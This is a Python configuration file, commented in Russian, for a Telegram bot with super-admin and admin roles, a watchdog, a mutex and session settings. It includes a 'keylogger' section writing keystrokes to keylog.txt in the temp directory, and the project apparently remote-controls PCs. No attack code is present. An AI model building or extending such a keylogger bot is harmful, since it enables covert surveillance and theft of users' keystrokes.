# config.py
"""
Конфигурация системы мульти-администраторов
Использует безопасную систему загрузки из .env файла
НИКОГДА не коммитьте .env файл в репозиторий!
"""

import os
import tempfile
from secure_config import get_secure_config

# Инициализация безопасной конфигурации
_config = get_secure_config()

# === КОНФИГУРАЦИЯ БОТА (из .env) ===
# BOT_TOKEN и SUPER_ADMIN_ID загружаются из .env файла или переменных окружения
BOT_TOKEN = _config.get('BOT_TOKEN', '')
SUPER_ADMIN_ID = _config.get_int('SUPER_ADMIN_ID', 0)

# Проверка критических переменных
if not BOT_TOKEN:
    print("⚠️ ВНИМАНИЕ: BOT_TOKEN не настроен!")
    print("   Создайте .env файл с BOT_TOKEN=ваш_токен")
    print("   Или установите переменную окружения BOT_TOKEN")

if not SUPER_ADMIN_ID:
    print("⚠️ ВНИМАНИЕ: SUPER_ADMIN_ID не настроен!")
    print("   Создайте .env файл с SUPER_ADMIN_ID=ваш_id")
    print("   Или установите переменную окружения SUPER_ADMIN_ID")

# === КОНФИГУРАЦИЯ МУТЕКСА ===
MUTEX_NAME = "KUSMAN_MAIN_BOT_MUTEX"

# === КОНФИГУРАЦИЯ ЛОГОВ ===
LOG_FILE = os.path.join(tempfile.gettempdir(), "bot_runtime.log")
WATCHDOG_LOG_FILE = os.path.join(tempfile.gettempdir(), "watchdog_runtime.log")

# === КОНФИГУРАЦИЯ КЕЙЛОГГЕРА ===
KEYLOG_FILE = os.path.join(tempfile.gettempdir(), "keylog.txt")

# === КОНФИГУРАЦИЯ WATCHDOG ===
WATCHDOG_POLL_INTERVAL = 5  # секунд
CRASH_LOOP_DELAY = 15  # задержка при обнаружении crash loop
MAX_RESTART_ATTEMPTS = 3

# === РОЛИ АДМИНИСТРАТОРОВ ===
ROLE_SUPER_ADMIN = "super_admin"
ROLE_ADMIN = "admin"

# === КОНФИГУРАЦИЯ СЕССИЙ ===
SESSION_TIMEOUT = 3600  # 1 час в секундах

# === КОНФИГУРАЦИЯ УСТРОЙСТВ ===
DEFAULT_DEVICE_NAME = "UnknownPC"